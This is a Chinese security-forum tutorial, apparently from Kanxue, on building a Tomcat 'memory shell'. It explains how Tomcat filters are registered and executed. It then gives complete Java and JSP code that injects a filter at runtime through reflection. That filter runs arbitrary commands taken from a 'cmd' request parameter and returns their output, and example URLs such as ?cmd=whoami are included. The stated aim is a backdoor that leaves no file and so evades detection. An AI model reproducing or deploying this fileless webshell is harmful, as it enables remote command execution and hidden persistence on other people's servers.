> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-272890.htm)

> [原创] 手把手教你实现 tomcat 内存马

内存马实现
=====

> 本文全是自己猜的，没有实际操作

内存马
---

1.  为什么要使用内存马
2.  有哪些类型的内存马
3.  如何编写内存马

### 为什么要使用内存马

1.  传统的 webshell 或以文件驻留的后门越来越容易被检测。
2.  文件不落地，检测困难

### 有哪些类型的内存马

1.  根据不同的容器都有自己对应的内存马
    1.  tomcat
    2.  weblogic
    3.  等

Tomcat Filter 内存马
-----------------

1.  Filter 是如何被创建的
2.  Filter 是如何被执行的
3.  Filter 是如何被销毁的（内存马暂时用不到）

### Tomcat 启动流程

1.  从 web.xml 文件读取配置信息

#### 流程

1.  从`webxml`读取配置
2.  将`FilterDef`加入`context`

`ContextConfig#configureContext`

```
for (FilterDef filter : webxml.getFilters().values()) {
    if (filter.getAsyncSupported() == null) {
        filter.setAsyncSupported("false");
    }
    context.addFilterDef(filter);
}

```

1.  如果`filterDef == null`我们需要设置三个东西
    1.  `filterDef.setFilterName(filterName);`
    2.  `filterDef.setFilterClass(filter.getClass().getName());`
    3.  `filterDef.setFilter(filter);`

`ApplicationContext`

```
FilterDef filterDef = context.findFilterDef(filterName);
 
// Assume a 'complete' FilterRegistration is one that has a class and
// a name
if (filterDef == null) {
    filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    context.addFilterDef(filterDef);
} else {
    if (filterDef.getFilterName() != null &&
            filterDef.getFilterClass() != null) {
        return null;
    }
}
 
if (filter == null) {
    filterDef.setFilterClass(filterClass);
} else {
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
}

```

`ContextConfig#configureContext`

```
for (FilterMap filterMap : webxml.getFilterMappings()) {
            context.addFilterMap(filterMap);
        }

```

`ContextConfig#processAnnotationWebFilter`

```
FilterMap filterMap = new FilterMap();

```

![](https://bbs.pediy.com/upload/attach/202205/886208_YHV3KY4DRXGM25Q.png)

 

![](https://bbs.pediy.com/upload/attach/202205/886208_BNRXM2C2KXWZZFT.png)

#### 总结

1.  从 web.xml 中读取到 tomcat filter 配置信息
2.  将过滤器类和 name 对应起来（FilterDef）
3.  将 URLPattern 和 name 对应起来（FilterMap）
4.  将 FilterDef 和 FilterMap 加入 context

### Tomcat Filter 初始化流程

![](https://bbs.pediy.com/upload/attach/202205/886208_24UNXYVM4GMCH24.png)

 

`StandardContext#filterStart`

1.  `ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, entry.getValue());`
2.  `filterConfigs.put(name, filterConfig);`

```
public boolean filterStart() {
 
        if (getLogger().isDebugEnabled()) {
            getLogger().debug("Starting filters");
        }
        // Instantiate and record a FilterConfig for each defined filter
        boolean ok = true;
        synchronized (filterConfigs) {
            filterConfigs.clear();
            for (Entry entry : filterDefs.entrySet()) {
                String name = entry.getKey();
                if (getLogger().isDebugEnabled()) {
                    getLogger().debug(" Starting filter '" + name + "'");
                }
                try {
                    ApplicationFilterConfig filterConfig =
                            new ApplicationFilterConfig(this, entry.getValue());
                    filterConfigs.put(name, filterConfig);
                } catch (Throwable t) {
                    t = ExceptionUtils.unwrapInvocationTargetException(t);
                    ExceptionUtils.handleThrowable(t);
                    getLogger().error(sm.getString(
                            "standardContext.filterStart", name), t);
                    ok = false;
                }
            }
        }
 
        return ok;
    } 
```

### Tomcat Filter 执行流程

*   通过分析 Filter 执行，可以知道一个 Filter 需要哪些基本的数据

```
@WebFilter(filterName = "testFilter",urlPatterns = "/*")
public class MyFilterDemo1 implements Filter {
 
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("filter init");
    }
 
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("do Filter");
        filterChain.doFilter(servletRequest, servletResponse);
    }
 
    @Override
    public void destroy() {
 
    }
}

```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

#### 分析 internalDoFilter

![](https://bbs.pediy.com/upload/attach/202205/886208_GKZAH8MZ8YJ4UH6.png)

*   filter 是一个数组
*   利用下标进行遍历和匹配规则
*   通过`Filter`数组或者说通过`FilterChain`找到第一个关键数据`ApplicationFilterConfig`
*   问题
    *   `FilterChain`是如何创建的？

#### 创建一个 FilterChain

```
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);

```

![](https://bbs.pediy.com/upload/attach/202205/886208_CFYXMTJ9BMNF32A.png)

#### [](#创建过滤链：createfilterchain)创建过滤链：createFilterChain

```
public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {
 
        // If there is no servlet to execute, return null
        if (servlet == null)
            return null;
 
        // Create and initialize a filter chain object
        ApplicationFilterChain filterChain = null;
        if (request instanceof Request) {
            Request req = (Request) request;
            if (Globals.IS_SECURITY_ENABLED) {
                // Security: Do not recycle
                filterChain = new ApplicationFilterChain();
            } else {
                filterChain = (ApplicationFilterChain) req.getFilterChain();
                if (filterChain == null) {
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                }
            }
        } else {
            // Request dispatcher in use
            filterChain = new ApplicationFilterChain();
        }
 
        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
 
        // Acquire the filter mappings for this Context
        //获取此上下文的筛选器映射
        StandardContext context = (StandardContext) wrapper.getParent();
        FilterMap filterMaps[] = context.findFilterMaps();
 
        // If there are no filter mappings, we are done
        if ((filterMaps == null) || (filterMaps.length == 0))
            return (filterChain);
 
        // Acquire the information we will need to match filter mappings
        //获取匹配过滤器映射所需的信息
        DispatcherType dispatcher =
                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);
 
        String requestPath = null;
        Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);
        if (attribute != null){
            requestPath = attribute.toString();
        }
 
        String servletName = wrapper.getName();
 
        // Add the relevant path-mapped filters to this filter chain
        //将相关路径映射筛选器添加到此筛选器链
        for (int i = 0; i < filterMaps.length; i++) {
            if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
                continue;
            }
            if (!matchFiltersURL(filterMaps[i], requestPath))
                continue;
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                context.findFilterConfig(filterMaps[i].getFilterName());
            if (filterConfig == null) {
                // FIXME - log configuration problem
                continue;
            }
            filterChain.addFilter(filterConfig);
        }
 
        // Add filters that match on servlet name second
        //添加与servlet名称匹配的过滤器
        for (int i = 0; i < filterMaps.length; i++) {
            if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
                continue;
            }
            if (!matchFiltersServlet(filterMaps[i], servletName))
                continue;
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                context.findFilterConfig(filterMaps[i].getFilterName());
            if (filterConfig == null) {
                // FIXME - log configuration problem
                continue;
            }
            filterChain.addFilter(filterConfig);
        }
 
        // Return the completed filter chain
        return filterChain;
    }

```

Java 代码实现伪代码
------------

```
package cn.jl.demo;
 
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.tomcat.util.net.DispatchType;
 
import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
 
@WebFilter("/*")
public class MyFilterDemo implements Filter {
    static {
        try{
            final String name = "jl";
            final String URLPath = "/*";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
 
            MyFilterDemo myFilterDemo = new MyFilterDemo();
 
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(myFilterDemo);
            filterDef.setFilterName(name);
            standardContext.addFilterDef(filterDef);
 
        }catch (Exception ex){
            ex.printStackTrace();
        }
    }
 
 
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
 
    }
 
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("Do Filter ......");
        String cmd;
        if ((cmd = servletRequest.getParameter("cmd")) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
 
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("doFilter");
    }
 
    @Override
    public void destroy() {
 
    }
}

```

`http://localhost:8080/xx.jsp?cmd=whoami`

 

![](https://bbs.pediy.com/upload/attach/202205/886208_ZGHCBPN672YGNUQ.png)

JSP 代码分析
--------

```
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
 
<%
    //设置 final String name = "jl";
 
    //获取filterConfigs
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
 
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
 
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
 
    if (filterConfigs.get(name) == null) {
        //这里实现filter
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
 
            }
 
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                System.out.println("Do Filter ......");
                String cmd;
                if ((cmd = servletRequest.getParameter("cmd")) != null) {
                    Process process = Runtime.getRuntime().exec(cmd);
                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                            new java.io.InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }
                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                    return;
                }
 
                filterChain.doFilter(servletRequest, servletResponse);
                System.out.println("doFilter");
            }
 
            @Override
            public void destroy() {
 
            }
 
        };
 
        //设置FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
 
        //设置FilterMap
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
 
 
        standardContext.addFilterDef(filterDef);
        standardContext.addFilterMapBefore(filterMap);
 
        //将FilterConfig加入FilterConfigs中
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
 
        filterConfigs.put(name, filterConfig);
    }
%> 
```

http://localhost/filter.jsp

 

http://localhost/1.jsp?cmd=whoami

参考链接
====

> https://xz.aliyun.com/t/10362#toc-6
> 
> https://xz.aliyun.com/t/10696

[【公告】 [2022 大礼包]《看雪论坛精华 22 期》发布！收录近 1000 余篇精华优秀文章!](https://bbs.pediy.com/thread-271749.htm)